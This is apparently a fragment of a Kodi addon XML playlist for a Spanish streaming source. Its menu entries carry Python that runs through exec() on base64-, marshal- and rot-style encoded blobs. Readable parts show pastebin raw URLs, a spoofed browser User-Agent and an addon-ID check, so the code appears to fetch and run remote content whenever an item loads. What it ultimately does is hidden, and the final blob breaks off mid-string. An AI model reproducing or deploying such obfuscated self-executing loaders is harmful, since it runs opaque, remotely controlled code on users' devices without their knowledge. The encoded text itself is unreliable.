import base64;exec(base64.b64decode("aW1wb3J0IG1hcnNoYWw7ZXhlYyhtYXJzaGFsLmxvYWRzKGJhc2U2NC5iNjRkZWNvZGUoIll3QUFBQUFBQUFBQUFRQUFBRUFBQUFCekRRQUFBR1FBQUlRQUFGb0FBR1FCQUZNb0FnQUFBR01EQUFBQUNBQUFBQVlBQUFCREFBQUFjL1FBQUFCa0FRQmtBQUJzQUFCOUF3QmtBUUJrQUFCc0FRQjlCQUJrQVFCa0FBQnNBZ0I5QlFCa0FRQmtBQUJzQXdCOUJnQmtBUUJrQUFCc0JBQjlCd0JrQWdCOEJ3QnFCUUNEQUFCcUJnQmtBd0NEQVFCckJnQnlnUUI4QkFCcUJ3QmtCQUJrQlFCcEFnQmtCZ0JrQndBMlpBZ0FaQWtBTm1RS0FIUUlBSU1CQW1vSkFGTmtDd0I4QndCcUJRQ0RBQUJxQmdCa0F3Q0RBUUJyQmdCeXhnQjhCQUJxQndCa0JBQmtCUUJwQWdCa0JnQmtCd0EyWkFnQVpBa0FObVFLQUhRSUFJTUJBbW9KQUZOOEJBQnFCd0JrREFCa0JRQnBBZ0JrQmdCa0J3QTJaQWdBWkFrQU5tUUtBSFFJQUlNQkFtb0pBRk5rQUFCVEtBMEFBQUJPYWYvLy8vOTBDd0FBQUdOeWFYTjBZV3hoZW5Wc2RBSUFBQUJwWkhNaEFBQUFhSFIwY0hNNkx5OXdZWE4wWldKcGJpNWpiMjB2Y21GM0wycFFXbUZDUjFsT2RBY0FBQUJvWldGa1pYSnpjMGdBQUFCTmIzcHBiR3hoTHpVdU1DQW9WMmx1Wkc5M2N5Qk9WQ0EyTGpNN0lGZFBWelkwT3lCeWRqbzFOUzR3S1NCSFpXTnJieTh5TURFd01ERXdNU0JHYVhKbFptOTRMelUxTGpCekNnQUFBRlZ6WlhJdFFXZGxiblJ6RkFBQUFHaDBkSEJ6T2k4dmNHRnpkR1ZpYVc0dVkyOXRkQWNBQUFCU1pXWmxjbVZ5ZEFZQUFBQjJaWEpwWm5sMEJRQUFBR1psYzNSaGN5RUFBQUJvZEhSd2N6b3ZMM0JoYzNSbFltbHVMbU52YlM5eVlYY3ZSalJvZG1KcGVIa29DZ0FBQUhRQ0FBQUFjbVYwQ0FBQUFISmxjWFZsYzNSemRBSUFBQUJ2YzNRRUFBQUFlR0p0WTNRSkFBQUFlR0p0WTJGa1pHOXVkQVVBQUFCQlpHUnZiblFNQUFBQVoyVjBRV1JrYjI1SmJtWnZkQU1BQUFCblpYUjBCUUFBQUVaaGJITmxkQVFBQUFCMFpYaDBLQWdBQUFCMEVRQUFBRTh3VHpCUE1EQXdUekF3TURCUE1FOHdkQkVBQUFCUE1FOVBUekF3VHpBd1R6QXdUekJQVDNRUkFBQUFUMDlQVHpCUE1EQlBUMDlQTUU4d1R6QlNCZ0FBQUZJSEFBQUFVZ2dBQUFCU0NRQUFBRklLQUFBQUtBQUFBQUFvQUFBQUFITUdBQUFBYzJOeWFYQjBkQXdBQUFCSFpYUk1VMUJ5YjBSaGRHRUJBQUFBY3d3QUFBQUFBVHdCR3dFcUFSc0JLZ0pPS0FFQUFBQlNFd0FBQUNnQUFBQUFLQUFBQUFBb0FBQUFBSE1HQUFBQWMyTnlhWEIwZEFnQUFBQThiVzlrZFd4bFBnRUFBQUJ6QUFBQUFBPT0iKSkp"))
]]></expres>
<page></page>
</regex>
<thumbnail>https://i.imgur.com/53pjwki.jpg</thumbnail>
<fanart>https://i.imgur.com/skkYoSC.jpg</fanart>
</item>


<item>
<title>[COLOR gold]*[/COLOR] [COLOR lightsalmon]Dilo [COLOR white]web[/COLOR]</title>
<link>$doregex[A]</link>
<regex>
<name>A</name>
<listrepeat><![CDATA[
<title>[COLOR gold]*[COLOR lightsalmon]Dilo [COLOR white][A.param1] [/COLOR]</title>
<thumbnail>https://i.imgur.com/QBdkMFK.jpg</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
<link>$doregex[busca]</link>
]]></listrepeat>
<expres><![CDATA[#$pyFunction


import base64;exec(base64.b64decode(""))
]]></expres>
<page></page>
<agent></agent>
</regex>
<regex>
<name>busca</name>
<listrepeat><![CDATA[
<title>[COLOR white][busca.param3]  [COLOR gold][busca.param4][/COLOR]</title>
<link>$doregex[encontrar_servidores]</link>
<thumbnail>[busca.param2]<thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
elegir = '[A.param2]'
import re,requests,base64,xbmc,xbmcgui,xbmcaddon,shutil
import base64;exec(base64.b64decode(""))
]]></expres>
<page></page>
</regex>
 <regex>
 <name>encontrar_servidores</name>
<listrepeat><![CDATA[
<title>[COLOR gold][encontrar_servidores.param4] [encontrar_servidores.param3] [COLOR white][busca.param3][/COLOR]</title>
<info>[COLOR white][busca.param6][/COLOR]
[COLOR white][busca.param7][/COLOR]</info>
<link>$doregex[selecion_inteligente]</link>
<thumbnail>[busca.param2]</thumbnail>
<fanart>http://www.arturogoga.com/wp-content/uploads/2009/12/image4.png</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url = '[busca.param1]'
import xbmc,requests,re,xbmcaddon
import base64;exec(base64.b64decode(""))
]]></expres>
<page></page>
</regex>
 <regex>
 <name>link_final</name>
<expres><![CDATA[#$pyFunction
url = '[encontrar_servidores.param1]'
url2 = '[encontrar_servidores.param2]'
import xbmc,requests,re,xbmcaddon
import base64, codecs
morpheus = 'IyBlbmNvZGVkIGJ5DQojIEZURw0KDQppbXBvcnQgYmFzZTY0LCB6bGliLCBjb2RlY3MsIGJpbmFzY2lpDQptb3JwaGV1cyA9ICc2NTRhNzk3NDU3NTYzMjUwNmY3YTcxMzI2NjU0MmY1MzJiNTEzODc0N2E1NTUwNTA2MTQ5MzY3NTc3NDM1MTMxNTg2NDRiNjQ0YjdhNmI0ZTQxNTI0ZjYzNDY0MTQ2NDM3MzRkMzU0YzUxNzE1ODUzNjc1YTY5NTEzNjZiNzI3ODM4NjU3NDZlNjI2MTY1MzY1YTJiNWE2ZjY0NDg1NTY2NzI2YzcyNzA3ODQ4NjgzNzY1MzMzOTM1NjU3OTMzNzE1NDM1Mzg0ZjU0NTg2YzM1NTA2YTc4MmYzMjY3MmIyZjJmNzY0YjZlNTQyZjUwNTUyZjJmNTc1ODU4MzMzODM1MzY2NjYyNzkyYjc2NWE3MDc2MmY3NDJiNjU0YTZhMzgzOTZmNmI2Yjc5NzUyYjJmMmY3MTQ5NzY3MjJiMzIzMzc3MmIzMzM3NzAzNzM5MmYyYjY5Nzk0NzMyNTg2ZDc2NmMyYjJmNGIzMzM5NTQ0MzQ0MzY2NDc1NjY0YjZkNDU3MDM3NGEzMTVhNzkzMzYzNzU0NzMzMzMzMjM5NmMzNzMyNjM1NDQ4NTE3MzM5NDg2YzUyNWE1NzM5NDg1ODMyNzM1MDY2NTA0YTMzNzg1ODY1Mzc1OTJiNDYzNDM3Mzg2YTZlNTg3NDQ4NzY0ZDQ2NGYzNzY0NTkzODM3NWEzMzc3NmQzNzZlNjIyYjc4NzkzNDQ5MmY2OTYxMzg2ZDU3MzY2NjcyNjI2MzcxNzk2NDcwNWE3Mzc4NGY1ODcxNmE3MjRjNGE3NTcxNTE3NTZlNTM0MTc0NmU2ZDU3NGIyYjc5Njg3OTcwNjg1MzUwNjQ1NTRkNzU1MjU3Nzc3Mjc5NjM2YTc5NGY0ZDZmMzMzNzRhNjY0ZjU5NjM2YjczNGM2MTM2MzI2OTc5NzY0MjY0NTc0ZDU3NDk2MjM5MmI0NDU4NmE2YjczNTIzMjZlNGM0MzZlNGIzNTVhMzg2YzUyMzY2MTU1NjI1NzdhNDk3NDc1Nzk1NzczNTU2MjUyNTA1Mzc2NGM1MzY3Njk3NzcyNGI2ZTU2NjE1NjcxNTU2YzcxMzc1ODQ3MmY3NDQxNDY2NTY0Mzg2MjczNTE1YTMyNDg1MTY0NTY2YzUyNGQzNTQ2NzI1OTYzNGE1Njc1NGYzMzRhNDY1NjRmNjM0YTY1NjU3YTZkNTczOTQ5Nzg3MzY3NGUzMzQzNTg3MjcwNTk0NDJmMzM0YzcxNzM0MzM2NjU0MzY5Njc2MzdhNmI2NTQ5NTIyYjY1Nzk0ZTM0Njk2ODU1MzM1MTU5MzI3NzYyNTMyYjc3NjYzMDM1NmE0YTUzNmE3Mjc3MzE1MzM3NTMzMDZjMzY2ZDMzNDYzNjM1N2EzODYyNTA2YzYyNzMyYjU5Mzg3OTRkNjY2YzM5NjE3MTc4NTIzNjRiNzM1MzZkNTU3MDY5NTA1OTU2MmI0MjZhMzY1NDMxNDg2MzU2NzA1NzU1NmMzNzU3NTY0NzM4NWE0MzM5MzE1MTY2NDc0NTM3MzU2ZDZjNTg0ZTY3MzA1OTZhMzU0NjY2NGI3MjYxNTU3NDU3MzY2NzZhMzU2ZTM1NWE1OTRmNzk2MTMxNjM0ZjU2MzMzNjZkNjY0NjcyNTM1ODcwNTQzNjQzNTUyZjU4NDg2OTZlNzk1MjYzMzU0YzcxNzM1OTJiNmQ1MDM0NDk3OTc5N2E0NDMwNGUzODUyNmE2YzVhNmE3MDM0NDQ1ODdhMzc3MzY3MzczODM1MzU2MjQ1NjM1OTQyMmY1YTRkNTYzMjM2NGU2NDZkNDI3NjUxNTgzMjZiNzgzMzZjNTczNTQ5MmYzMTUyNDgzNTZjNDI1MDRiMmIzNzRiNDM2ZTMyNTQzMzYxNGY1Mzc3NDcyZjc4NGQ3OTY2Mzk2OTU3NDc3MTRiNjU1MTYxMmY1MDQzNWE1NDc4NGM2Zjc5Mzk3NTQ5Mzc1MTc4MzI2ZjY5NzY2MjQ0NzY3MTY5Njg2NzcxMzE0ZDJmNDM2NzQ3NGQ2NDYyNDIzMTM3NDc0NTM3NjM0OTc5NGQ2MTJmNjc2ODU2NzYzMDY5NGI3NTM5NTM3MDJiMmY2ZDU2NjkzNDc4NTYzMzc2Njk0ODY5NGUzNTRjMmI0YTQ2MzUzNDU2NTA2MzU1NGE2MzY0NjE0OTUwMmY0YjQ5NjM2MzcxNzg3YTJiNTk2MjMxNWE3MzZiNzYzMzMxNDIyYjMzNjI1MzMxNDI1MDczMzk3OTZlNjYzODUyNTQ3MjZiNDYyZjU1NmI0MjYxNzc0NzMzNDc0MjU4Nzk2MTZkNzE0NTRmNTY2ZjczMzU1MzMxNDQ3MjMwNTU0NjM3Nzc0NzJmNDUzNzczNmQ0OTczNjgzNjU2Mzc1YTQzNzM1ODJmNmY3NzYzNjY3MTQyMmI2NjU5NzI0NjJiNjc1MzM5NDc0ZjRmMzU3YTY5Njc2ZTZiMzY1NTRjNmU3OTcyNTk2YjYzNGIyYjczNjE0NDU5NDkzMTM2NTU1NDJiNjk3NjQ1NDE2NDY2MzQ0NDdhNTEzODc5NGU2OTQxNjI3NTMxNTIzMzU4NjY1MTc5MmY3OTZkNmQ0NzY2NDc3NjM1NmQ1NTM1NGYzMzQzNzI0NjRlNTU2NTRlNzA2MjQ1NGYyZjczMzY0YTdhNmM2NDQ5MmI0YTZiMmY1MTUyN2E1NTZkNTU2NjM4NWE3ODYzNGY1NzRjNmQ3MjQxMzE0Mzc2NGY0YzVhMzI2MjU1NWEzMDcwNDQ3NDRhNjQzMTM5NDI3NjMzMmIzMDc0NTQ0MzMxNDQ2ZTcwNmIzNDQ5NjMzOTQ2NTI1NzY1NDUzNjZmMzEzODcwNmU0ZjQ0NjU3NDYzNmQ0YzY4NGQzNjRiNzk3MzM2NmQzNjU5NGY1NTRkNjQ2YjRhMmY2ZTZhNmY2OTM5NTE2YTRkNjE2MTQ3NTgzMDJiNTk3MDZmNzEzNzQ1NzQzNTU2NmE1ODcwNmY0ODU3NmY1MjJmNGI0ODc3NTEzNzU5NjczNzc4NTg1MjM1Nzk2YTc3NzQ1MjM1NTE1ODQ3NDg1ODMwNzU3MTRiNzgyZjZlNDI0YzQ3Njk1MDZmNDY3YTVhNTA3MDQyNTE1ODQ4NTczNjQzNGQ1NTMzMzU1NDRmNDU2NjdhNDQ2MzM5NTE2NDdhNjc0Z'
trinity = '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'
oracle = 'g1ODY0MzAzNzUxMzU0NTUyNTE3YTYzNDI1Mzc3Njk2NTQ1NTY2YTUxMzQ0ZTMwNmE1MDZlNzM2Nzc4NTk0MTU4Njc0OTQ3NDU0ZDc4NjU3NTZmNTk1NzM0NGE2ZjZiNjY1MTUxMmY0MTUzMzE3NzU0NTI1MDRkNGQ0ODQ0NDY3NzRjNmM3OTYzNmY2MzVhNDI0YjY0Njk2Nzc0NGM2NDQ4NWE0YzZhNjU2NzY0NzM0ZDM3NDQ2MjRhMzg2ZjUzMzI3NzYxMmI0NTQ4Nzc2YzQ3NGE1MTYxNGY2ZDQyNGMzMDZiMzI3Nzc4NDkzMDJmNTk0NTc4Njg0YjQ5NmI2YjZkNmY2NTMyNjg3NTc1NTk1OTQyNWE0Mjc5NGY2ZDY0NzI2ODQ4NzQ0Zjc0MzU2ODczNTUzOTUxNGE3OTRkMzQ0MTYyNjc0NDY2NjEzNjY4NGQ3ODRmNDM3NDU5NjIyYjcwNDU1NDY2NGQ2ZjRjNzA0MjQ5Mzk0ODQ3NzEzODQ5NDQ3NTYyNTk0NjdhNDE0NDYzNDI2MzMwNGEzNjYyMzQ0NTRlMzA2ODJiNDE1NjM3NmY2NDYzNmMyYjQxNDEzNTc4NDczOTRhNGQ0NzRkNmIyYjQxNDUyZjQxNjQ0NTRhMzk2OTRhNzU2OTQ0NTAzMjQ5NjI3NDUzNzc0NjY5Njk1MTM2NmQ0MjM5MzA1NDZhNDE0OTc2NmM1MDU0MzY0MTY4NjM2ZjZjMmI0MTZlNjE0MjZjNjg3MzM0NDM3MjQyNDY2NDQxNDY0MTJiNTY2NDY3NmU2NTQxNzczNjM2Njg1MzM5NjE2NDQ0Njc0NDY1NzU0MzU4NTI3NzRmNmQ0ODUwMmY0MTUyNmM0MTc1Nzc0NDM1NjM0ODM4NmI1MjMyNDE0NDcxNGY0MjRkNjM0OTU4Njg0ZjU1NTIzNzc3NDkzNTY4NDYzOTYzNTc0Nzc2NmQ3ODQ4NGQ0MjVhNzg0ODJmNDM3MTU0NGEyZjY3NTQ0Nzc2Njc2YzQ0NTQ3NzY5MzY2Nzc3NTk2ZDY4NzEzNjQzNjIyYjQ2NjI1NzQyNTc2NTZiNTQ2NTQzNTU2MTU0NzI1OTVhNmQ0OTRhMmY3NzZjMmI2ODMwNmM1MTMwNDc2NzY4NGQ2NDUzMzI0ZjY5NWE2NjY5NGU3NjUzNzU2OTQ4NTE1ODMwNDU0Mjc3Mzk2ZDc2NDc2NDQ0Njc0NzZkNjE3NzQ4NjQ2ZjQ4NTU0NzVhNjk0Yjc2NTI0MjY1NDk2ZTZmMzU0NTVhMmI0MjMzNTI1ODZiNjc0ZjZiMmIzMjU5NzA3NzUzNGU1MTYyMzg2Mzc3MzA2YjRhNzI2NzRkMzM3NzZjNjU0MTc0NTk1MjQ4NTg1OTRhMzE2YzUwNjM1MTU1Mzg0ZDc2NjE0YzM2NzczMzRmNjkzMDU2NTQzMzU2NTU3YTM1NDkzNTY4NzY0NzdhNzE3NjQ0NTQzMjMxNjk1MjM3NDk1MzZjNTc2NzcwNTg2MzM0NmQzMzc0NTUzMTM1NjE2ODYyMmIzNTQ4NjY0NjMyNzE0MjJiMzQ1OTY2MzA2Njc4MzQ1OTM5NDgzOTRiNDU2OTQ3NDUzNTc3NmU0ZjY3MzEzOTY5NjY0YjUzNjI1MjM4NjM3MzM4NmEzMTYxNWE0MTUwNTc1NDQ3NTAzODUyNzU0ZDUwNzA0ODZiNjk0ZjYxNTE0ODQ0Mzc3OTRmMzQzMDY4NTc3MTQzMzQ0MzM3NTY1MDY2NmM0NjRlNDE2ZTM1Nzg2ODZiNmYzNjQ0NTU0NDMwNTQyZjU1NzU0MzU0MzY1OTZkNDIzNDUyNmQ2NTUwNmQ1NDZmNzgzOTUxMzM1OTM3MzE0YzYzNTk3MzY4NmE1MDY5NTYzNDYyNTc0MTM0MzE1NDU4NDk0YjZiNjU2MzYxNGEyZjU5NGQ2NjQ0NTgzMDQ1NGI2MzQ1NTUzMzMwNDE3NjU1NDUzMjMyNDc2ZTZmNWEyYjZmNTUzODUzNzg3ODc2MzczMDM2Njk0YzM3NmI0MzY1MzQ0NDRjNzMzMDU1NTg2NTQzMzc1MTU4NTI3NDU4NzMzODRiMzk1MTUwNmU2MjY1NTI1ODZiMzk0OTc5NDI0ZjM5NmY0MjZmNjc0NzY3NzQzNjUyNmU1YTcwNGY3MzY0NDU2OTMyNzY0NTQyMzM2MjM1Njg2ODZmNTI2ODU3NGI0NzY4NmM1NjQ4Mzk0YTY2NDM3NjQyNTk2ZjM3NzY1NDYyNzc0ODVhN2EzMzc1NmQ2MzRkNTA0ZDYxNjc0YjY3MzAzNzYxNzY3NjZjNGE0MjY1NDk1MjQyMzg2YTc3MzM3NDU2NDU1NDZhN2E0YjczNjY1MzU0NTE0OTJmNzA1YTU1MzUzMDUxNTA2NTcxNGEzMTc4NjgzNzU0MzIzNzQzNmU0YTY4NzA3MzYxNDQ1NDU3NmI1NDJmNTU0MjdhNGY2OTRjNzQ1MzY2NzA3NDUzNTAzMDQyMmI2NDM1NjYzMjMxNTEzNDY2MzY3MzRmMzY3NjYyNGU0MjZlNGI0YTM5NzU0ZTY4NzI2MTRlNjg2ZjYxNmE3MTY3NTE1NDYzNjYzNTcxMzA3Nzc2NDczMDY5MmY0OTZlNzA0YzY1Mzc2OTU1NTAzMzcwNDY2MzJiMzg1ODc5NzE1NjM0NTUzMTMyNTg0ODM2Mzg3MjM2NGE3NzY0MzczNjM4NTAzNzcyNTQ1MjZjNmU2NTM2Mzk1ODQ1NzU2OTUwMzc2ODUwNDk0NTM2NzczMTJiNjk3YTM1NWEzNTRjNTU0MjM2Njk0YjM0NTM1NDY0NTA1NTcwMzY2NzRmNTQ1YTM5NmM1NjRhNjU0NjM4NTE0ZDc4NzA3NDY0NTI1MjRiNzU0YTZjNmI0ZTY1NmI1ODc4NGI3Mjc4MzM2Zjc0NTE3MjM2NDE1MDZkNDQ0ZjQzNmU2MTdhMmY1NDVhMzA3MjcyNTg0ZjY1NTU2NjJiNjE3MTRiNDk2NTc5NzM3ODU5MzU3NDcwNzY3NDM4MmY3MTcxMzIzNDc2Njk1NTM4NDU1OTZkNmEzOTJmNmE2MjRjNmMzNTcyNmI1MjU4MzE0YjQ5NzIzMjU4NGYzMzQ4MzE1NzY2NDI3MTMzNjUzNjY2NGU1NTM1NTc3MTMyMmI2NjcxNDk1ODRjMmIzOTM1NTg1NTY2Nzg2YjM1NmQ2MjU5NGE2YzczNTA0ODUwNzcyZjRkNTk1MTc2NjUzMzM4MzU0YTRlMzIzNTU1NjY3OTczMzM3MDM'
keymaker = '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